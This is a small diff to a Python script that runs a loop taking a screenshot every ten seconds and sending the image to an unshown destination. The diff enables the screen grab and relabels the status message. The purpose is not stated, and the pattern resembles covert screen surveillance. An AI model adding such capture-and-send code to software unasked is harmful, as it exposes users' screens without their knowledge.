@@ -10,7 +10,7 @@ while(1):
 	file_name = "current_img.jpeg"
 	current_time = datetime.now().strftime('%Y-%m-%d-%H-%M-%S')
 	print(current_time)
-	#im=ImageGrab.grab().save(file_name,'JPEG')
+	im=ImageGrab.grab().save(file_name,'JPEG')
 	#im = ImageGrab.grab().tobytes()
 	with open("current_img.jpeg", 'rb') as image_file:
 		image = image_file.read()
@@ -18,7 +18,7 @@ while(1):
 	if(ret != 0):
 		print("error")
 	else:
-		print("data sent")
+		print("screenshot sent")
 
 	time.sleep(10)
 
